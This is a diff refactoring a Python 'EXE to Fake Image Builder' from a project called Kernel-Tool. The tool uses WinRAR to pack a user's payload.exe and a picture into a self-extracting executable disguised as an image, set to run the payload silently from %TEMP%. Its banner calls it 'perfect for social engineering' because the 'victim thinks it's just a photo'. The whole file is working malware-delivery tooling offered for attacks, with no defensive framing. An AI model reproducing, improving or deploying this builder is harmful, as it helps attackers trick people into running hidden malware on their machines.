@@ -1,166 +1,167 @@
 # Copyright (c) Kernel-Tool
 # See the file 'LICENSE' for copying permission
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
+# ------------------------------------------------------------------------------------------------
 # EN:
-#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not touch or modify the code below. If there is an error, please contact the owner,
+#       but under no circumstances should you touch the code.
 #     - Do not resell this tool, do not credit it to yours.
 # FR:
-#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
+#       propriétaire, mais en aucun cas vous ne devez toucher au code.
 #     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
+# ------------------------------------------------------------------------------------------------
 
 import os
 import sys
 import subprocess
 import shutil
 import random
-from colorama import init, Fore
+from Config.Config import exe_to_image_banner
 
-init(autoreset=True)
-LIGHTCYAN = Fore.LIGHTCYAN_EX
+LC = "\033[38;2;0;200;255m"
+RS = "\033[0m"
+
 
 class EXEtoImageBuilder:
     def __init__(self):
-        self.output_folder = os.path.join(os.getcwd(), 'output')
-        self.winrar_path = self.find_winrar()
+        self.output_folder = os.path.join(os.getcwd(), "output")
         self.icon_path = None
         self.image_path = None
         self.payload_path = None
         self.output_exe = None
+        self.winrar_path = self._find_winrar()
 
-    def find_winrar(self):
-        possible_paths = [
-            r'C:\Program Files\WinRAR\WinRAR.exe',
-            r'C:\Program Files (x86)\WinRAR\WinRAR.exe',
-            r'C:\WinRAR\WinRAR.exe'
+    def _find_winrar(self):
+        candidates = [
+            r"C:\Program Files\WinRAR\WinRAR.exe",
+            r"C:\Program Files (x86)\WinRAR\WinRAR.exe",
+            r"C:\WinRAR\WinRAR.exe",
         ]
-        for path in possible_paths:
+        for path in candidates:
             if os.path.exists(path):
                 return path
         return None
 
+    def _log(self, msg, prefix="[+]"):
+        print(f"{LC}{prefix} {msg}{RS}")
+
     def print_banner(self):
-        banner = """
- ________  __    __  ________    ________   ______         ______  __       __   ______
-|        \|  \  |  \|        \  |        \ /      \       |      \|  \     /  \ /      \
-| $$$$$$$$| \[ | \]| $$$$$$$$   \$$$$$$$$|  $$$$$$\       \$$$$$$| \[ \   / \]|  $$$$$$\
-| \[ __     \ \]\/  \[ | \]__  ______ | \[ | \]  | \[ ______ | \]  | $$$\ /  $$$| \[ __\ \]
-| \[ \     > \]  \[ | \]  \|      \| \[ | \]  | \[ |      \| \]  | $$$$\  $$$$| \[ |    \
-| $$$$$    /  $$$$\ | $$$$$ \$$$$$$| \]   | \[ | \] \$$$$$$| \[ | \]\\[  \] \[ | \] \$$$$
-| \[ _____ | \] \\[ \| \]_____      | \[ | \]__/ \[ _| \]_ | \[ \$$$| \]| \[ __| \]
-| \[ \| \]  | \[ | \]     \     | \[ \ \]    \[ | \] \| \[ \$ | \] \\[  \]
- \$$$$$$$$ \\[ \ \] \$$$$$$$$      \\[ \$$$$$$        \$$$$$$ \ \]      \$$  \$$$$$$
-                                                                                 
-                                                                                 
-        """
-        print(LIGHTCYAN + banner)
-        print(LIGHTCYAN + '[+] ============================= EXE to Fake Image Builder ==============================')
-        print(LIGHTCYAN + '[+] Creates a self-extracting .exe that looks like an image')
-        print(LIGHTCYAN + '[+] Uses your custom icon + background image')
-        print(LIGHTCYAN + '[+] Silently executes your payload.exe in background')
-        print(LIGHTCYAN + '[+] Perfect for social engineering – victim thinks it\'s just a photo')
-        print(LIGHTCYAN + '[+] Output in \'output\' folder')
-        print(LIGHTCYAN + '[+] =====================================================================================')
+        print(exe_to_image_banner)
+        lines = [
+            "============================= EXE to Fake Image Builder ==============================",
+            "Creates a self-extracting .exe that looks like an image",
+            "Uses your custom icon + background image",
+            "Silently executes your payload.exe in background",
+            "Perfect for social engineering – victim thinks it's just a photo",
+            "Output in 'output' folder",
+            "=====================================================================================",
+        ]
+        for line in lines:
+            self._log(line)
+        print()
 
     def get_user_input(self):
         os.makedirs(self.output_folder, exist_ok=True)
-        print(LIGHTCYAN + '\n[*] Enter the full paths to your files:\n')
+        self._log("Enter the full paths to your files:\n", prefix="[*]")
 
-        use_icon = input(LIGHTCYAN + 'Do you want a custom icon? (y/n, default n): ').strip().lower()
-        if use_icon == 'y':
-            icon_path = input(LIGHTCYAN + 'Enter full path to .ico file: ').strip()
-            if os.path.exists(icon_path) and icon_path.lower().endswith('.ico'):
+        use_icon = input(f"{LC}Do you want a custom icon? (y/n, default n): {RS}").strip().lower()
+        if use_icon == "y":
+            icon_path = input(f"{LC}Enter full path to .ico file: {RS}").strip()
+            if os.path.exists(icon_path) and icon_path.lower().endswith(".ico"):
                 self.icon_path = icon_path
-                print(LIGHTCYAN + f'[+] Icon selected: {self.icon_path}')
+                self._log(f"Icon selected: {self.icon_path}")
             else:
-                print(LIGHTCYAN + '[-] Invalid icon – compiling without custom icon')
-                self.icon_path = None
-        else:
-            self.icon_path = None
+                self._log("Invalid or non-existent icon – compiling without custom icon", prefix="[-]")
 
-        image_path = input(LIGHTCYAN + 'Enter full path to image (jpg/png): ').strip()
-        if not os.path.exists(image_path) or not image_path.lower().endswith(('.jpg', '.jpeg', '.png')):
-            print(LIGHTCYAN + '[-] ERROR: Invalid image path or format!')
+        image_path = input(f"{LC}Enter full path to image (jpg/png): {RS}").strip()
+        if not os.path.exists(image_path) or not image_path.lower().endswith((".jpg", ".jpeg", ".png")):
+            self._log("ERROR: Invalid image path or format!", prefix="[-]")
             sys.exit(1)
         self.image_path = image_path
-        print(LIGHTCYAN + f'[+] Image selected: {self.image_path}')
+        self._log(f"Image selected: {self.image_path}")
 
-        payload_path = input(LIGHTCYAN + 'Enter full path to payload.exe: ').strip()
-        if not os.path.exists(payload_path) or not payload_path.lower().endswith('.exe'):
-            print(LIGHTCYAN + '[-] ERROR: Invalid payload path!')
+        payload_path = input(f"{LC}Enter full path to payload.exe: {RS}").strip()
+        if not os.path.exists(payload_path) or not payload_path.lower().endswith(".exe"):
+            self._log("ERROR: Invalid payload path!", prefix="[-]")
             sys.exit(1)
         self.payload_path = payload_path
-        print(LIGHTCYAN + f'[+] Payload selected: {self.payload_path}')
+        self._log(f"Payload selected: {self.payload_path}")
 
-        output_name = input(LIGHTCYAN + 'Enter output filename (default: picture.exe): ').strip() or 'picture.exe'
-        if not output_name.lower().endswith('.exe'):
-            output_name += '.exe'
+        output_name = input(f"{LC}Enter output filename (default: picture.exe): {RS}").strip() or "picture.exe"
+        if not output_name.lower().endswith(".exe"):
+            output_name += ".exe"
         self.output_exe = os.path.join(self.output_folder, output_name)
 
-    def create_sfx_config(self, temp_dir):
-        config_content = f"""Path=%TEMP%
-Silent=1
-Overwrite=1
-Setup={os.path.basename(self.payload_path)}
-TempMode
-Title=Viewing image...
-"""
-        config_path = os.path.join(temp_dir, 'sfx_config.txt')
-        with open(config_path, 'w', encoding='utf-8') as f:
+    def _create_sfx_config(self, temp_dir):
+        payload_name = os.path.basename(self.payload_path)
+        config_content = (
+            f"Path=%TEMP%\n"
+            f"Silent=1\n"
+            f"Overwrite=1\n"
+            f"Setup={payload_name}\n"
+            f"TempMode\n"
+            f"Title=Viewing image...\n"
+        )
+        config_path = os.path.join(temp_dir, "sfx_config.txt")
+        with open(config_path, "w") as f:
             f.write(config_content)
         return config_path
 
     def build(self):
         if not self.winrar_path:
-            print(LIGHTCYAN + '[-] ERROR: WinRAR not found! Install WinRAR.')
+            self._log("ERROR: WinRAR not found! Install WinRAR.", prefix="[-]")
             sys.exit(1)
 
-        print(LIGHTCYAN + '[+] WinRAR found – building fake image...')
-        temp_dir = os.path.join(self.output_folder, f'temp_{random.randint(10000, 99999)}')
+        self._log("WinRAR found – building fake image...")
+
+        temp_dir = os.path.join(self.output_folder, f"temp_{random.randint(10000, 99999)}")
         os.makedirs(temp_dir, exist_ok=True)
 
-        # Copy files
-        shutil.copy(self.payload_path, temp_dir)
-        shutil.copy(self.image_path, temp_dir)
+        try:
+            shutil.copy(self.payload_path, temp_dir)
 
-        # Rename image to photo.jpg
-        new_image_path = os.path.join(temp_dir, 'photo.jpg')
-        os.rename(os.path.join(temp_dir, os.path.basename(self.image_path)), new_image_path)
+            image_ext = os.path.splitext(self.image_path)[1].lower()
+            normalized_image = os.path.join(temp_dir, f"photo{image_ext}")
+            shutil.copy(self.image_path, normalized_image)
 
-        config_path = self.create_sfx_config(temp_dir)
-        sfx_module = os.path.join(os.path.dirname(self.winrar_path), 'Default.SFX')
+            config_path = self._create_sfx_config(temp_dir)
 
-        if os.path.exists(sfx_module):
-            sfx_option = [f'-sfx{sfx_module}']
-        else:
-            sfx_option = ['-sfx']
+            sfx_module = os.path.join(os.path.dirname(self.winrar_path), "Default.SFX")
+            sfx_option = [f"-sfx{sfx_module}"] if os.path.exists(sfx_module) else ["-sfx"]
 
-        icon_option = [f'-iicon{self.icon_path}'] if self.icon_path else []
+            icon_option = [f"-iicon{self.icon_path}"] if self.icon_path else []
 
-        command = [
-            self.winrar_path, 'a', '-ep1', '-inul',
-            *sfx_option,
-            f'-z{config_path}',
-            *icon_option,
-            self.output_exe,
-            os.path.join(temp_dir, '*')
-        ]
+            command = [
+                self.winrar_path,
+                "a",
+                "-ep1",
+                "-inul",
+                *sfx_option,
+                f"-z{config_path}",
+                *icon_option,
+                self.output_exe,
+                os.path.join(temp_dir, "*"),
+            ]
 
-        print(LIGHTCYAN + '[*] Creating SFX executable...')
-        result = subprocess.run(command, capture_output=True, text=True)
+            self._log("Creating SFX executable...", prefix="[*]")
+            result = subprocess.run(command, capture_output=True, text=True)
 
-        if result.returncode == 0 and os.path.exists(self.output_exe):
-            print(LIGHTCYAN + f'[+] SUCCESS! Fake image created: {self.output_exe}')
-            print(LIGHTCYAN + '[+] Double-click → opens as image + runs payload silently')
-        else:
-            print(LIGHTCYAN + '[-] ERROR during build:')
-            print(LIGHTCYAN + (result.stderr or result.stdout))
+            if result.returncode == 0 and os.path.exists(self.output_exe):
+                self._log(f"SUCCESS! Fake image created: {self.output_exe}")
+                self._log("Double-click → opens as image + runs payload silently")
+            else:
+                self._log("ERROR:", prefix="[-]")
+                print(LC + (result.stderr or result.stdout) + RS)
 
-        shutil.rmtree(temp_dir, ignore_errors=True)
-        print(LIGHTCYAN + '[+] Cleanup done')
-        input(LIGHTCYAN + '\nPress Enter to exit...')
+        finally:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            self._log("Cleanup done")
 
-if __name__ == '__main__':
-    os.system('cls' if os.name == 'nt' else 'clear')
+        input(f"{LC}[+] Press Enter to exit...{RS}")
+
+
+if __name__ == "__main__":
+    os.system("cls" if os.name == "nt" else "clear")
     builder = EXEtoImageBuilder()
     builder.print_banner()
     builder.get_user_input()
